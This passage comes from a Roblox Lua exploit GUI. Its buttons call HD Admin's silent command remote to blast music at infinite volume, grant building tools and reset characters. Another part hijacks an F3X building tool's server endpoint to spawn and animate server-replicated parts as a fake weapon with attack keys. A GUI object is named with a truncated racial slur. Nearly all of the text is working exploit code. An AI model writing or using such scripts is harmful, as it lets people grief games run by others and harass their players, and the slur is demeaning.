		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_64()
			local script = G2L["64"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 108587575286050 ;volume inf")
			end)
		end;
		task.spawn(C_64);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_66()
			local script = G2L["66"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 133848688651683 ;volume inf")
			end)
		end;
		task.spawn(C_66);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_68()
			local script = G2L["68"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 140556359662060 ;volume inf")
			end)
		end;
		task.spawn(C_68);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_6a()
			local script = G2L["6a"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 100754234156181 ;volume inf")
			end)
		end;
		task.spawn(C_6a);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_6c()
			local script = G2L["6c"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 72266196363368 ;volume inf ;pitch 0.27")
			end)
		end;
		task.spawn(C_6c);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_6e()
			local script = G2L["6e"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 1064334571 ;volume inf")
			end)
		end;
		task.spawn(C_6e);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_70()
			local script = G2L["70"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 99993460719133 ;volume inf ;pitch 0.2")
			end)
		end;
		task.spawn(C_70);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_72()
			local script = G2L["72"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 109761785986269 ;volume inf")
			end)
		end;
		task.spawn(C_72);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_74()
			local script = G2L["74"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 113238741822041 ;volume inf ;pitch 0.14")
			end)
		end;
		task.spawn(C_74);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_76()
			local script = G2L["76"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 101381195264372 ;volume inf ;pitch 0.17")
			end)
		end;
		task.spawn(C_76);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_78()
			local script = G2L["78"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 17422156627 ;volume inf")
			end)
		end;
		task.spawn(C_78);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_7a()
			local script = G2L["7a"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 99907604701668 ;volume inf ;pitch 0.131")
			end)
		end;
		task.spawn(C_7a);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_7c()
			local script = G2L["7c"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 99974358068663 ;volume inf ;pitch 0.15")
			end)
		end;
		task.spawn(C_7c);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_7e()
			local script = G2L["7e"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 93650961728068 ;volume inf ;pitch 0.12")
			end)
		end;
		task.spawn(C_7e);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_80()
			local script = G2L["80"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 80515722989681 ;volume inf ;pitch 0.22")
			end)
		end;
		task.spawn(C_80);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_82()
			local script = G2L["82"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 92512466676196 ;volume inf ;pitch 0.125")
			end)
		end;
		task.spawn(C_82);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_84()
			local script = G2L["84"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 89740490855607 ;volume inf ;pitch 0.1")
			end)
		end;
		task.spawn(C_84);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_86()
			local script = G2L["86"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 1839246734 ;volume inf")
			end)
		end;
		task.spawn(C_86);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_88()
			local script = G2L["88"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 16190782181 ;volume inf")
			end)
		end;
		task.spawn(C_88);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_8a()
			local script = G2L["8a"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 108239208627770 ;volume inf ;pitch 0.145")
			end)
		end;
		task.spawn(C_8a);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_8c()
			local script = G2L["8c"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 135348619400760 ;volume inf ;pitch 0.11")
			end)
		end;
		task.spawn(C_8c);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_8e()
			local script = G2L["8e"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 18841888868 ;volume inf")
			end)
		end;
		task.spawn(C_8e);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_90()
			local script = G2L["90"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 98334300605408 ;volume inf ;pitch 0.2")
			end)
		end;
		task.spawn(C_90);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_92()
			local script = G2L["92"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 15689439571 ;volume inf")
			end)
		end;
		task.spawn(C_92);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_94()
			local script = G2L["94"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 86412047196482 ;volume inf")
			end)
		end;
		task.spawn(C_94);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_96()
			local script = G2L["96"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 73491005061565 ;volume inf ;pitch 4.6")
			end)
		end;
		task.spawn(C_96);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_98()
			local script = G2L["98"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 116802855460592 ;volume inf ;pitch 0.16")
			end)
		end;
		task.spawn(C_98);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_9a()
			local script = G2L["9a"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 114366138718591 ;volume inf ;pitch 0.1")
			end)
		end;
		task.spawn(C_9a);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_9c()
			local script = G2L["9c"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 111473140376275 ;volume inf ;pitch 0.115")
			end)
		end;
		task.spawn(C_9c);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_9e()
			local script = G2L["9e"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 115811492979415 ;volume inf ;pitch 0.15")
			end)
		end;
		task.spawn(C_9e);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_a0()
			local script = G2L["a0"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 76750962223675 ;volume inf ;pitch 0.102")
			end)
		end;
		task.spawn(C_a0);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_a2()
			local script = G2L["a2"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 1839246711 ;volume inf ;pitch 0.9")
			end)
		end;
		task.spawn(C_a2);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_a4()
			local script = G2L["a4"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 73835470482241 ;volume inf ;pitch 0.28")
			end)
		end;
		task.spawn(C_a4);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_a6()
			local script = G2L["a6"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 129245295981728 ;volume inf ;pitch 0.11")
			end)
		end;
		task.spawn(C_a6);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_a8()
			local script = G2L["a8"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 75647211925136 ;volume inf ;pitch 0.115")
			end)
		end;
		task.spawn(C_a8);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_aa()
			local script = G2L["aa"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 129264134829339 ;volume inf ;pitch 0.115")
			end)
		end;
		task.spawn(C_aa);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_ac()
			local script = G2L["ac"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 121290295295713 ;volume inf ;pitch 0.115")
			end)
		end;
		task.spawn(C_ac);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_ae()
			local script = G2L["ae"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 114512954419100 ;volume inf")
			end)
		end;
		task.spawn(C_ae);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_b0()
			local script = G2L["b0"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 97568687950497 ;volume inf")
			end)
		end;
		task.spawn(C_b0);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_b2()
			local script = G2L["b2"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 70890602505194 ;volume inf ;pitch 0.95")
			end)
		end;
		task.spawn(C_b2);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_b4()
			local script = G2L["b4"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 107020752830019 ;volume inf ;pitch 0.15")
			end)
		end;
		task.spawn(C_b4);
		-- StarterGui.v2.Frame.TextButton.LocalScript
		local function C_b6()
			local script = G2L["b6"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";buildingTools me ;BTools me")
			end)
		end;
		task.spawn(C_b6);
		-- StarterGui.v2.Frame.TextButton.LocalScript
		local function C_b8()
			local script = G2L["b8"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";r6 me")
			end)
		end;
		task.spawn(C_b8);
		-- StarterGui.v2.Frame.TextButton.LocalScript
		local function C_bb()
			local script = G2L["bb"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 139581929665915 ;volume inf ;pitch 1.12")
			end)
		end;
		task.spawn(C_bb);
		-- StarterGui.v2.Frame.TextButton.LocalScript
		local function C_bd()
			local script = G2L["bd"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";refresh me")
			end)
		end;
		task.spawn(C_bd);
		-- StarterGui.v2.Frame.LocalScript
		local function C_be()
			local script = G2L["be"];
			function dragify(Main)
				dragToggle = nil
				dragSpeed = 0.2
				dragInput = nil
				dragStart = nil
				dragPos = nil
	
				function updateInput(input)
					Delta = input.Position - dragStart
					Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
					game:GetService("TweenService"):Create(Main, TweenInfo.new(.25), {Position = Position}):Play()
				end
	
				Main.InputBegan:Connect(function(input)
					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
						dragToggle = true
						dragStart = input.Position
						startPos = Main.Position
						input.Changed:Connect(function()
							if (input.UserInputState == Enum.UserInputState.End) then
								dragToggle = false
							end
						end)
					end
				end)
	
				Main.InputChanged:Connect(function(input)
					if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
						dragInput = input
					end
				end)
	
				game:GetService("UserInputService").InputChanged:Connect(function(input)
					if (input == dragInput and dragToggle) then
						updateInput(input)
					end
				end)
			end
	
			dragify(script.Parent)
		end;
		task.spawn(C_be);
	
		return G2L["1"], require;
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_1b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_1d()
local script = G2L["1d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		local RunService = game:GetService("RunService")
	
		local function getplayer(name,speaker)
			local list = {}
	
			if name == "" or name == nil or name == " " then
				return speaker
			end
			for _,player in game.Players:GetPlayers() do
				if string.match(string.lower(player.Name),"^"..string.lower(name)) then
					table.insert(list,player)
				end
			end
	
	
			return list
		end
	
		local function gs(str,begin,boolean)
			local things = {}
	
			for i=begin,#str do
				if boolean == true then
					table.insert(things,str[i].." ")
				else
					table.insert(things,str[i])
				end
			end
			return table.concat(things)
		end
	
		local lp = game:GetService("Players").LocalPlayer
	
		local charlp = lp.Character
	
		local server = charlp:FindFirstChildOfClass("Tool"):WaitForChild("SyncAPI"):WaitForChild("ServerEndpoint")
		local handle = charlp:FindFirstChildOfClass("Tool").Handle
	
		local function createpart(CFram,parent)
			local args = {
				"CreatePart",
				"Normal",
				CFram,
				parent
			}
			local part = server:InvokeServer(unpack(args))
			return part
		end
	
		local function createseat(CFram,parent)
			local args = {
				"CreatePart",
				"Seat",
				CFram,
				parent
			}
			local part = server:InvokeServer(unpack(args))
			return part
		end
	
		local function createball(CFram,parent)
			local args = {
				"CreatePart",
				"Ball",
				CFram,
				parent
			}
			local part = server:InvokeServer(unpack(args))
			return part
		end
	
		local function createfolder(contents,parent)
			local args = {
				"CreateGroup",
				"Folder",
				parent,
				contents
			}
			return server:InvokeServer(unpack(args))
		end
	
		local function mesh(inst,id,textureid,size,offset,tint)
			local args = {
				"CreateMeshes",
				{
					{
						Part = inst
					}
				}
			}
			server:InvokeServer(unpack(args))
			local args = {
				"SyncMesh",
				{
					{
						MeshType = Enum.MeshType.FileMesh,
						Part = inst
					}
				}
			}
			server:InvokeServer(unpack(args))
			local args = {
				"SyncMesh",
				{
					{
						Part = inst,
						MeshId = "rbxassetid://"..id,
						Scale = size,
						Offset = offset,
						VertexColor = color,
						TextureId = "rbxassetid://"..textureid
					}
				}
			}
			server:InvokeServer(unpack(args))
	
		end
	
		local function rename(inst,str)
			local args = {
				"SetName",
				{
					inst
				},
				str
			}
			server:InvokeServer(unpack(args))
		end
	
		local function removedecals(inst)
			for i,v in inst:GetDescendants() do
				if v:IsA("Decal") then
					local args = {
						"Remove",
						{
							v
						}
					}
					server:InvokeServer(unpack(args))
				end
			end
		end
	
		local function color(inst,color)
			local args = {
				"SyncColor",
				{
					{
						Color = color,
						UnionColoring = true,
						Part =inst
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function weld(at0,at1,bool)
			if bool == true then
				local args = {
					"CreateWelds",
					{
						at0,
						at1
					},
					at0
				}
				server:InvokeServer(unpack(args))
			else
				local list = {}
				for i,v in at0:GetDescendants() do
					if string.match(v.Name,"Weld") then
						table.insert(list,v)
					end
				end
				for i,v in at1:GetDescendants() do
					if string.match(v.Name,"Weld") then
						table.insert(list,v)
					end
				end
				local args = {
					"RemoveWelds",
					list
				}
				server:InvokeServer(unpack(args))
			end
		end
	
		local function Refmaterial(value,inst)
			local args = {
				"SyncMaterial",
				{
					{
						Part=inst,
						Reflectance = value
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function TransMaterial(value,inst)
			local args = {
				"SyncMaterial",
				{
					{
						Part=inst,
						Transparency = value
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function anchor(bool,inst)
			local args = {
				"SyncAnchor",
				{
					{
						Part=inst,
						Anchored = bool
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function unweld(inst)
			local args = {
				"SyncMove",
				{
					{
						Part = inst,
						CFrame = inst.CFrame
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function move(inst,CFram)
			local args = {
				"SyncMove",
				{
					{
						Part = inst,
						CFrame = CFram
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function delete(inst)
			local args = {
				"Remove",
				{
					inst
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function resize(inst,size)
			local args = {
				"SyncResize",
				{
					{
						Part = inst,
						CFrame = inst.CFrame,
						Size = size
					}
				}
			}
			server:InvokeServer(unpack(args))
		end
	
		local function collision(inst,bool)
			local args = {
				"SyncCollision",
				{
					{
						Part = inst,
						CanCollide = bool
					}
				}
			}
			server:InvokeServer(unpack(args))
	
		end
	
	
	
		local char = lp.Character
		local fakeTorso = char:WaitForChild("Torso")
		local torso = char:WaitForChild("Torso")
	
		local lfake = createpart(torso.CFrame,workspace)
		local rfake = createpart(torso.CFrame,workspace)
		local mfake = createpart(torso.CFrame,workspace)
		anchor(true,lfake)
		anchor(true,rfake)
		resize(lfake,Vector3.new(1, 2, 1))
		resize(rfake,Vector3.new(1, 2, 1))
		collision(rfake,false)
		collision(lfake,false)
		color(rfake,char["Right Arm"].Color)
		color(lfake,char["Left Arm"].Color)
		color(mfake,Color3.new(1, 0, 1))
		collision(mfake,false)
		anchor(true,mfake)
		resize(mfake,Vector3.new(0.75, 5.34, 1))
		mesh(mfake,3255273463,5404303499,Vector3.new(10, 10, 20),Vector3.new(0,0,0),Color3.new(1,0,1))
	
		local death = false
	
		local lfakeRel = CFrame.new(0.625, -0.625, -0.875, -1, 0, 0, 0, 1, 0, 0, 0, -1)
		local rfakeRel = CFrame.new(0, -0.625, -1.875, -1, 0, 0, 0, 1, 0, 0, 0, -1)
		local mfakeRel = CFrame.new()
	
		local attacking = false
	
		local function rebaseRelativeCFrame(relativeCFrame, newBaseCFrame)
			return newBaseCFrame * relativeCFrame
		end
	
		for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do
			v:Stop()
		end
	
		char.Humanoid.Died:Connect(function()
			death = true
		end)
	
		local db = false
	
		local larm = char["Left Arm"]
		local rarm = char["Right Arm"]
		rfakeRel = CFrame.new(1.08930969, 0.0900583267, 0.643432617, 0.764953971, 0.517821431, -0.383022487, 0.270802021, 0.280988753, 0.920712829, 0.584389687, -0.808025837, 0.0747166276) 
		lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
		mfakeRel = CFrame.new(0.375, 1.50666738, 3.06625366, 1, 0, 0, 0, -0.819151998, 0.57357645, 0, -0.57357645, -0.819151998)
	
		TransMaterial(1,larm)
		TransMaterial(1,rarm)
	
		game["Run Service"].RenderStepped:Connect(function()
			if not char or not char.Parent then return end
			if death == true then return end
	
			local currentTorso = char:FindFirstChild("Torso")
			if not currentTorso then return end
	
			move(lfake, rebaseRelativeCFrame(lfakeRel, currentTorso.CFrame))
			move(rfake, rebaseRelativeCFrame(rfakeRel, currentTorso.CFrame))
			move(mfake, rebaseRelativeCFrame(mfakeRel, currentTorso.CFrame))
		end)
	
		--[[ controls ]]--
	
	
		game.UserInputService.InputBegan:Connect(function(key,typing)
			if typing or death then return end
			if key.KeyCode == Enum.KeyCode.R then
				if db == false then
					db = true
					rfakeRel = CFrame.new(2.00197601, 0.529197574, -0.0891418457, -0.0145850861, -0.9236238, -0.383022815, 0.0748470128, -0.382997364, 0.920712292, -0.997088373, -0.0152394464, 0.0747165307) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(3.31957245, 3.45993948, -0.722579956, 0.0499905124, -0.0713938102, -0.99619472, -0.34327212, -0.937904716, 0.0499904677, -0.937904656, 0.33946681, -0.07139384)
					task.wait(0.1)
					rfakeRel = CFrame.new(1.63251495, 0.398410916, -0.371368408, -0.604866743, -0.6981619, -0.383022904, -0.188849837, -0.341503978, 0.920712948, -0.773609996, 0.629242182, 0.0747164488) 
					lfakeRel = CFrame.new(-0.730621338, 0.091219902, 0.724395752, 0.663414061, -0.38302213, 0.642787576, -0.352088988, 0.59820956, 0.719846368, -0.660238743, -0.703874588, 0.262002766) 
					mfakeRel = CFrame.new(2.64407349, 2.26358032, -2.63957214, -0.709787369, -0.0868241489, -0.699044824, -0.576889515, -0.497825563, 0.647586584, -0.404228657, 0.862920225, 0.303262413)
					attacking = true
					task.wait(0.1)
					rfakeRel = CFrame.new(1.63251495, 0.398410797, -0.371368408, -0.918838501, 0.0950292051, -0.383023083, -0.38806349, -0.0411823839, 0.920714438, 0.0717206299, 0.994623423, 0.0747163594) 
